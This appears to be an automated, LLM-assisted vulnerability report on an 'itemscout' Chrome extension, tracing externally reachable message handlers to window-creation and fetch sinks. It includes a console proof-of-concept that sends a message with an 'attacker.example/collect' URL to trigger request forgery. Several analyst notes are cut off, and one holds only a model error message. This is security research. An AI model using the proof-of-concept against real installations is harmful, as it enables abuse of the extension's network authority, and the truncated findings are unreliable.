# ExPAgent Static Verification — ecmeogcbcoalojmkfkmancobmiahaigg v5.4.2

- Browser: `chrome`
- LLM: `deepseek` / `deepseek-v4-pro`
- Flows in report: 20  |  Verified: 3
- Coverage: node=0.424, scope=0.402
- Flow types: {'REQUEST_FORGERY': 16, 'PRIVILEGE_ESCALATION': 4}  |  Severities: {'HIGH': 20}

**Assessment:** Verified 3 flow(s): 1 true-positive, 0 false-positive, 0 partial-available (PA), 2 uncertain, 0 duplicate; 0 flagged triggerable for dynamic testing.

---

## Flow #19 — 🔴 TRUE POSITIVE  (PRIVILEGE_ESCALATION / HIGH, confidence 0.60)

- **Source**: `CHROME_ONMESSAGEEXTERNAL_MESSAGE` in `background` [BG_1] @ L1:C11332 -> L1:C11333
- **Sink**: `CHROME_WINDOWS_CREATE_OPTIONS` in `background` [BG_1] @ L1:C68426 -> L1:C69369
- **Severity evidence**: ['*://*.itemscout.io/*']
- **Source report Flow ID**: `2`
- **Provenance**: source=`EXTERNAL_MESSAGE`, sender=`?`

**Reasoning:** Structured extraction unavailable; explicit analyst conclusion preserved from the final static transcript: ## Verification Ledger

**(a) Who controls the source?**
`chrome.runtime.onMessageExternal` in the MV3 background service worker (`background.js`). The listener is registered as:

```
chrome.runtime.onMessageExternal.addListener(S(Se))
```

`externally_connectable.matches` is `["*://itemscout.io/*", "*://*.itemscout.io/*"]`. There is no `sender.id`/extension-ID allowlist (`authenticatedExtensionAllowlist: null`); the sender is a web page on `itemscout.io` or any subdomain (wildcard `*.itemscout.io`, plus `*://` = http/https). Per the browser-trust rules, origin restriction alone is exploitable via XSS/subdomain control — it is not an unforgeable boundary. So the message payload is attacker-controllable within that surface.

**(b) Exact source→sink path (verified in source):**
1. `function S(e){return (t,a,r)=>{ const o = t?.message; const n = e[o]; ... const s = n(t,{sender:a}); ... }}` — the dispatcher reads the attacker-chosen action field `t.message` and invokes the matching handler from map `Se`.
2. `Se` contains:
   ```js
   openSmartStore: e => {
     const t = e.url;
     return new Promise((resolve, reject) => {
       Pe(t, r => { ... })
     })
   }
   ```
   So `e.url` (

**Attacker control:** See preserved static analyst transcript.

**Confirmed path:** See preserved static analyst transcript.

**Dynamic-test guidance** (triggerable: no, mechanism: `OTHER`)

---

## Flow #0 — 🟡 UNCERTAIN  (REQUEST_FORGERY / HIGH, confidence 0.30)

- **Source**: `CHROME_ONMESSAGEEXTERNAL_MESSAGE` in `background` [BG_1] @ L1:C11332 -> L1:C11333
- **Sink**: `FETCH_BODY` in `background` [BG_1] @ L1:C12863 -> L1:C12892
- **Severity evidence**: ['*://*.itemscout.io/*']
- **Source report Flow ID**: `2`
- **Provenance**: source=`EXTERNAL_MESSAGE`, sender=`?`

**Reasoning:** Structured extraction unavailable; preserved analyst notes: Confirmed directly at the sink anchor: `convertUrlImageToBase64: async e => { const t = await fetch(e.src) ... }` is inside the externally-reachable `Se` handler map, with `e.src` being the attacker's message field. No sender/origin guard exists in the dispatcher.

**Verdict summary:** An externally-connectable page on `itemscout.io`/subdomain can send `{message:"convertUrlImageToBase64", src:"https://attacker.example/..."}` (or a keyword handler) and make the extension's background context issue a `fetch` with attacker-controlled URL/query — a genuine request-forgery/SSRF path crossing into extension network authority.

---

## Dynamic guidance

1. Load the unpacked extension (아이템스카우트 5.4.2) in Chrome/Edge.
2. Note the extension ID from `chrome://extensions` (Developer mode), e.g. `abcdefghijklmnopabcdefghijklmnop`.
3. Open a page that satisfies `externally_connectable.matches`, e.g. `https://itemscout.io/` (or `https://x.itemscout.io/`).
4. In that page's DevTools console, run:

   ```js
   chrome.runtime.sendMessage("EXTENSION_ID",
     { message: "convertUrlImageToBase64", src: "https://attacker.example/collect" },
     r => console.log(r));
   ```

   Expected effect: the back

**Dynamic-test guidance** (triggerable: no, mechanism: `OTHER`)

---

## Flow #2 — 🟡 UNCERTAIN  (REQUEST_FORGERY / HIGH, confidence 0.30)

- **Source**: `CHROME_ONMESSAGEEXTERNAL_MESSAGE` in `background` [BG_1] @ L1:C11332 -> L1:C11333
- **Sink**: `FETCH_RESOURCE` in `background` [BG_1] @ L1:C12863 -> L1:C12892
- **Severity evidence**: ['*://*.itemscout.io/*']
- **Source report Flow ID**: `2`
- **Provenance**: source=`EXTERNAL_MESSAGE`, sender=`?`

**Reasoning:** Structured extraction unavailable; preserved analyst notes: Sorry, need more steps to process this request.

**Dynamic-test guidance** (triggerable: no, mechanism: `OTHER`)

---
